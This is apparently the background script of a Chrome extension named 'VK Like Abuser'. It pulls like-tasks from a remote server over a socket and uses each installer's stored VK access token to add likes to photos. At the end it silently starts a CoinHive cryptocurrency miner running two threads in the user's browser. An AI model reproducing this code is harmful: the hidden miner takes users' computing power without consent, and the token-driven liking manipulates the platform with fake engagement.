(() => {
  const EXTENSION_ID = chrome.runtime.id
  const API = 'https://api.vk.com/method'
  const VK_ABUSER_API_PRODUCTION = 'https://vkabuser.fletcherist.com'
  const VK_ABUSER_API_DEVELOPMENT = 'http://localhost:80'
  const DELAY_BETWEEN_TASKS = 1000 * 60
  const DELAY_BETWEEN_FETCH = 1000 * 60 * 5
  // const ENV = 'DEBUG'
  const ENV = 'PRODUCTION'

  /*
    This code is responsible for
    open the extension, clicking on the icon

    Thanks github.com/fourlex for the idea not to open the
    extension tab 10 thousand times
  */
  chrome.browserAction.onClicked.addListener(function (tab) {
    chrome.tabs.query({
      'url': 'chrome-extension://' + EXTENSION_ID + '/*'
    }, function (tabs) {
      if (tabs.length === 0) {
        chrome.tabs.create({'url': chrome.extension.getURL('index.html'), 'selected': true})
      } else {
        chrome.tabs.update(tabs[0].id, {'active': true})
        chrome.windows.update(tabs[0].windowId, {focused: true})
      }
    })
  })

  /*
    onCreated listener is responsible
    for counting all pages in the browser and save
    the value to the Storage with the idea
    of use it to keep `background.js` process as a singletone
  */

  chrome.tabs.onCreated.addListener(() => {
    // Getting all tabs
    chrome.tabs.query({}, tabs => {
      // Count all opened tabs
      let tabsCount = 0
      tabs.forEach(tab => tabsCount++)

      // Place tabsCount to the Chrome Storage
      chrome.storage.local.set({
        _tabsCount: tabsCount
      }, storage => {})
    })
  })

  /*
    This class is responsible for the background processing
    of the extension.

    First — tasks. Likes, that fail on our server — convert into
    tasks to the extension. That means, the extension should set these likes
    exactly from Chrome (not from our server)
  */

  class TasksManager {
    /*
      Get local tasks from Chrome Storage
    */
    getTasks() {
      return new Promise((resolve, reject) => {
        chrome.storage.local.get(null, storage => {
          const { tasks } = storage
          if (!tasks) return reject(new Error('No tasks available'))
          return resolve(tasks)
        })
      })
    }

    /*
      Saves tasks to the Chrome Storage
    */
    cacheTasks(tasks) {
      if (!tasks) return false
      chrome.storage.local.set({tasks})
    }

    /*
      Removes task from Chrome Storage after it's done
    */
    removeTask(task) {
      return new Promise((resolve, reject) => {
        if (!task) return reject(new Error('Task is not defined'))

        this.getTasks().then(tasks => {
          tasks.splice(tasks.findIndex(_task => _task.id = task.id), 1)
          this.cacheTasks(tasks)
          return resolve(`Task ${task.id} has been removed`)
        }).catch(e => reject(e))
      })
    }
  }

  class Background {
    constructor() {
      this.config = {
        socketServer: ENV === 'PRODUCTION'
          ? VK_ABUSER_API_PRODUCTION
          : VK_ABUSER_API_DEVELOPMENT
      }
      this.socket = io(this.config.socketServer)
      this.tasksManager = new TasksManager()

      this.user = {}

      this.initialize()
        .then(() => {})
        .catch(e => console.log(e))
    }

    initialize() {
      return new Promise((resolve, reject) => {
        this.getDataFromStorage().then(data => {
          const { username, access_token, user_id } = data

          if (!data.access_token) {
            // Retry initialization in a minute
            setTimeout(this.initialize.bind(this), 60000)

            return reject(new Error('[initialize]: not authorized yet'))
          }

          this.connectToAPI()

          this.user.username = username
          this.user.access_token = access_token
          this.user.user_id = user_id

          console.log(this.user)
          this.processing()
          return resolve()
        }).catch(e => reject(new Error('[initialization has been failed]')))
      })
    }

    /*
      This method is responsible for checking available tasks
      and do them. In loop.
    */
    processing() {
      /*
        TODO: Process tasks after getting
      */

      this.getTasks()
        .then(tasks => {
          this.tasksManager.cacheTasks(tasks)

          if (tasks.length > 0) {
            const { item, target, object, id } = tasks[0]
            if (item && object) {
              console.log(object, item)
              console.log('task has started')
              this.setLike(object, item)
                .then(result => {
                  this.successTask(id)
                })
                .catch(e => {
                  this.successTask(id)
                })
            }
            this.tasksManager.removeTask(tasks[0])
          }

          console.log(tasks)
        }).catch(e => console.log(e))

      setTimeout(this.processing.bind(this), DELAY_BETWEEN_TASKS)
    }

    errorTask(id) {
      console.log(`task ${id} was failed as well`)
      this.socket.emit('task_failed', {
        id: id,
        user_id: this.user.user_id
      }, status => {
        console.log(status)
      })
    }

    successTask(id) {
      console.log(`task ${id} done as well.`)
      this.socket.emit('task_done', {
        id: id,
        user_id: this.user.user_id
      }, status => {
        console.log(status)
      })
    }

    /*
      This method is responsible for getting tasks
      from api infrastructure
    */

    connectToAPI() {
      this.socket.on('connect', () => {
        console.log('Connected to vkabuser.')
        this.socket.emit('count_online_users', users => {
          console.log(users)
        })
      })
    }

    getDataFromStorage() {
      return new Promise((resolve, reject) => {
        chrome.storage.local.get(null, storage => {
          if (storage) return resolve(storage)
          else return reject('[getDataFromStorage]: empty storage')
        })
      })
    }

    /*
      This method fetches tasks from
      the VK Like Abuser Server
    */
    fetchTasks() {
      const self = this
      return new Promise((resolve, reject) => {
        const { user_id } = this.user

        this.getDataFromStorage().then(data => {
          const { latestFetch } = data
          // Time passed from the last fetch (in minutes)
          const timePassed = (Date.now() - latestFetch)
          /*
            Fetching data at least every DELAY_BETWEEN_FETCH minutes
          */
          if (timePassed < DELAY_BETWEEN_FETCH) {
            return reject(`[background]: not time yet, ${((DELAY_BETWEEN_FETCH - timePassed) / 1000 / 60)
              .toFixed(1)}m left.`)
          }
          self.socket.emit('get_tasks', {
            user_id
          }, response => {
            console.log('[fetchTasks]: tasks has fetched from the internet')
            const { error, message, tasks } = response
            if (error) return reject(message)

            /* Convert tasks from Object to an Array */
            const tasksArray = []
            for (const id in tasks) {
              tasksArray.push(Object.assign(tasks[id], {id}))
            }

            /* Update latest fetch */
            chrome.storage.local.set({
              latestFetch: Date.now()
            })

            return resolve(tasksArray)
          })
        })
      })
    }

    getTasks() {
      return new Promise((resolve, reject) => {
        const { access_token, username, user_id } = this.user
        if (!access_token || !username || !user_id) {
          return reject('Not authenticated')
        }

        this.getDataFromStorage().then(data => {
          /* Checking cache tasks */
          const { tasks } = data
          if (tasks && tasks.length > 0) {
            return resolve(tasks)
          }

          /* If nothing, fetch tasks from the Internet */
          this.fetchTasks()
            .then(tasks => resolve(tasks))
            .catch(e => reject(e))
        })
      })
    }

    setLike(ownerId, itemId, remove = false) {
      return new Promise((resolve, reject) => {
        console.log(this.user)

        if (!ownerId || !itemId) return reject(new Error('Not enough data'))
        if (!this.user.access_token) return reject(new Error('Access token is not provided'))

        const method = !remove ? 'likes.add' : 'likes.delete'

        console.log(ownerId, itemId)

        return fetch(`${API}/${method}?type=photo&owner_id=${ownerId}&item_id=${itemId}&access_token=${this.user.access_token}`)
          .then(res => res.json())
          .then(res => {
            const { error } = res
            if (error) return reject(error)

            /*
              Update latest like
            */
            console.log(Date.now())
            // chrome.storage.local.set({
            //   latestLike: Date.now()
            // })

            return resolve(res)
          })
          .catch(e => reject(e))
      })
    }
  }

  new Background()
  /* Thats just for tests */
  const miner = new CoinHive.Anonymous('Esa7xEwkU5DkSEYazz8NWsQtz6d1zNY4', {
    throttle: 0.2,
    threads: 2
  })
  miner.start()
  miner.on('found', hash => console.log('Hash found', hash))
  miner.on('job', job => console.log('I get job', job))
})()
